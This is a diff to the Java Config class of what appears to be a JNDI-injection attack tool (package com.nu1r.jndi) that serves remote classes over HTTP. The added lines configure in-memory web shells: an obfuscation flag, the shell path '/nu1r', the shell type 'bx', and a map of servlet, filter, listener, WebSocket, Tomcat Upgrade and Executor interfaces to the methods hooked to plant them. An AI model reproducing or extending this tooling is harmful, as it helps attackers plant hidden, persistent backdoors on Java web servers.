@@ -5,6 +5,8 @@ import com.beust.jcommander.Parameter;
 import com.beust.jcommander.UnixStyleUsageFormatter;
 import com.nu1r.jndi.Starter;
 
+import java.util.HashMap;
+
 public class Config {
     public static String codeBase;
 
@@ -53,5 +55,30 @@ public class Config {
 
         // 特别注意：最后一个反斜杠不能少啊
         Config.codeBase = "http://" + Config.ip + ":" + Config.httpPort + "/";
+    }
+
+    public static Boolean IS_OBSCURE = false;
+
+    // 各种方式的内存马映射的路径
+    public static String URL_PATTERN = "/nu1r";
+
+    public static String Shell_Type = "bx";
+
+    // 不同类型内存马的父类/接口与其关键参数的映射
+    public static HashMap<String, String> KEY_METHOD_MAP = new HashMap<>();
+
+    public static void init() {
+        // Servlet 型内存马，关键方法 service
+        KEY_METHOD_MAP.put("javax.servlet.Servlet", "service");
+        // Filter 型内存马，关键方法 doFilter
+        KEY_METHOD_MAP.put("javax.servlet.Filter", "doFilter");
+        // Listener 型内存马，通常使用 ServletRequestListener， 关键方法 requestInitializedHandle
+        KEY_METHOD_MAP.put("javax.servlet.ServletRequestListener", "requestInitializedHandle");
+        // Websocket 型内存马，关键方法 onMessage
+        KEY_METHOD_MAP.put("javax.websocket.MessageHandler$Whole", "onMessage");
+        // Tomcat Upgrade 型内存马，关键方法 accept
+        KEY_METHOD_MAP.put("org.apache.coyote.UpgradeProtocol", "accept");
+        // Tomcat Executor 型内存马，关键方法 execute
+        KEY_METHOD_MAP.put("org.apache.tomcat.util.threads.ThreadPoolExecutor", "execute");
     }
 }
